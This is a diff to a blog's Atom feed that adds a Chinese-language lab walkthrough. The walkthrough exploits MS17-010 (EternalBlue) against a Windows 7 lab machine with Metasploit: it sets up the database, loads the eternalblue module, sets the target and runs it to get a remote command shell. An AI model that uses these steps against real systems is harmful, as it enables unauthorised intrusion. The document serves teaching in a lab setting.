@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://R1v0ir.github.io</id>
     <title>R1v0ir</title>
-    <updated>2020-05-06T10:21:20.080Z</updated>
+    <updated>2020-05-06T10:43:37.433Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://R1v0ir.github.io"/>
     <link rel="self" href="https://R1v0ir.github.io/atom.xml"/>
@@ -12,8 +12,8 @@
     <rights>All rights reserved 2020, R1v0ir</rights>
     <entry>
         <title type="html"><![CDATA[验证MS17_010(永恒之蓝)]]></title>
-        <id>https://R1v0ir.github.io/post/test/</id>
-        <link href="https://R1v0ir.github.io/post/test/">
+        <id>https://R1v0ir.github.io/post/MS17_010/</id>
+        <link href="https://R1v0ir.github.io/post/MS17_010/">
         </link>
         <updated>2020-05-06T07:19:43.000Z</updated>
         <content type="html"><![CDATA[<p><strong>漏洞描述：</strong><br>
@@ -21,8 +21,8 @@ Windows操作系统的SMBv1协议中存在安全漏洞。攻击者会扫描开�
 <p><b>实验目的：</b><br>
 通过Metasploit框架对win7主机进行渗透攻击，利用永恒之蓝MS17-010模块对该win7进行渗透，最终获得控制权。</p>
 <p><b>实验环境：</b><br>
-渗透机：kali linux<br>
-靶机：win7</p>
+渗透机：kali linux  ip:192.168.100.128<br>
+靶机：win7 ip:192.168.100.130</p>
 <p><b>实验要求：</b><br>
 kali能ping通win7 win7开启445端口 可用命令检查</p>
 <blockquote>
@@ -31,12 +31,53 @@ kali能ping通win7 win7开启445端口 可用命令检查</p>
 <p><strong>1.数据库初始化（如果是第一次使用则需要) </strong></p>
 <blockquote>
 <p>root@kali:~# msfdb init<br>
-<img src='G:\blos\Gridea_yum\images\MS17_010\init.png' ></p>
+<img src="https://R1v0ir.github.io/post-images/1588760806565.png" alt="" loading="lazy"></p>
 </blockquote>
 <p><b>2.终端进入metasploit</b></p>
 <blockquote>
 <p>root@kali:~# msfconsole<br>
-<img src='G:\blos\Gridea_yum\images\MS17_010\msfconsole.png' ></p>
+<img src="https://R1v0ir.github.io/post-images/1588760813757.png" alt="" loading="lazy"></p>
+</blockquote>
+<p><strong>3.进入以后 搜索漏洞 输入</strong></p>
+<blockquote>
+<p>msf5&gt; search ms17-010<br>
+<img src="https://R1v0ir.github.io/post-images/1588761016513.png" alt="" loading="lazy"></p>
+</blockquote>
+<p><strong>4.上一步返回的结果里 第三个模块 就是我们要利用的模块</strong></p>
+<blockquote>
+<p>exploit/windows/smb/ms17_010_eternalblue （这一条不是命令 是返回的结果)</p>
+</blockquote>
+<p><strong>5.使用这个模块 命令行输入</strong></p>
+<blockquote>
+<p>msf5&gt;use exploit/windows/smb/ms17_010_eternalblue<br>
+<img src="https://R1v0ir.github.io/post-images/1588761116090.png" alt="" loading="lazy"></p>
+</blockquote>
+<p><strong>6.在ms17-010模块中 输入show options即可展开全部该模块的使用设置</strong></p>
+<blockquote>
+<p>其中Required项为YES的是必须填写的，我们可以看到RHOSTST此时还为空，代表我们需要填写内容进去！注：RHOSTS为目标主机的IP地址<br>
+<img src="https://R1v0ir.github.io/post-images/1588761252130.png" alt="" loading="lazy"></p>
+</blockquote>
+<p><strong>7.设置靶机IP (也就是win7的ip) 输完命令后回车会返回设置好的结果</strong></p>
+<blockquote>
+<p>msf5 exploit(windows/smb/ms17_010_eternalblue)&gt; set rhosts 靶机IP<br>
+<img src="https://R1v0ir.github.io/post-images/1588761481678.png" alt="" loading="lazy"></p>
+</blockquote>
+<p><strong>8.开始模块利用  输入run或者exploit 然后回车</strong></p>
+<blockquote>
+<p>msf5 exploit(windows/smb/ms17_010_eternalblue)&gt; run<br>
+<img src="https://R1v0ir.github.io/post-images/1588761554329.png" alt="" loading="lazy"></p>
+</blockquote>
+<p>在第8步返回结果中 会有一行 Command shell session 1 opened(渗透机IP--&gt;靶机IP)<br>
+的返回结果 这条结果说明拿到了shell 也就是拿到了控制权</p>
+<p>此时会发现 输入命令的前面变了 变成<br>
+C:\Windows\system32&gt;<br>
+这样也说明我们进入win7的cmd界面<br>
+<img src="https://R1v0ir.github.io/post-images/1588761651809.png" alt="" loading="lazy"></p>
+<p><strong>9.查一下ip 是否是靶机的ip 是否能执行</strong></p>
+<blockquote>
+<p>C:\Windows\system32&gt; ipconfig<br>
+<img src="https://R1v0ir.github.io/post-images/1588761703939.png" alt="" loading="lazy"><br>
+执行以后 会返回靶机的IP信息</p>
 </blockquote>
 ]]></content>
     </entry>
